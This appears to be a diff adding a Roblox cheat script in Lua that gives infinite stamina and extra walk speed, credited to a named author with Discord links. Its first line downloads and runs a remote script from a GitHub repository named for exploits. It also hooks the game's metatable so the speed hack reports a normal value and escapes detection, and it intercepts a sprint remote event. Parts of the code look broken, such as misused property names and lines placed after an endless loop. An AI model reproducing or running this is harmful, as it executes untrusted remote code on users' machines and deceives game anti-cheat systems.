@@ -1,0 +1,36 @@
+loadstring(game:HttpGet'https://raw.githubusercontent.com/supersonicfan111/exploitstuff/master/remoteabuse.lua')()
+
+
+local games = game.Players.LocalPlayer.PlayerGui.Start.Points.InstantStamina.Text
+games.Text = "https://discord.gg/rj8PXHXmUe"
+
+
+local mt = getrawmetatable(game)
+
+setreadonly(mt, false)
+local old = mt.index
+
+mt.index = function(o, k)
+ if tostring(o) == "Humanoid" and tostring(k) == "WalkSpeed" then
+     return 16
+ end
+
+ return old(o, k)
+
+
+end
+
+
+
+InterceptRemoteArgs(game:GetService("ReplicatedStorage").FE.Sprint,function()
+return Ended
+end)
+
+while true do
+    wait()
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 22
+end
+
+local game = game.Players.LocalPlayer.PlayerGui.Start.Points.InstantStamina.Text
+
+game.Text = "Infinite Stamina by TalentedFaizan08 (https://discord.gg/wfm5acUKSX)"
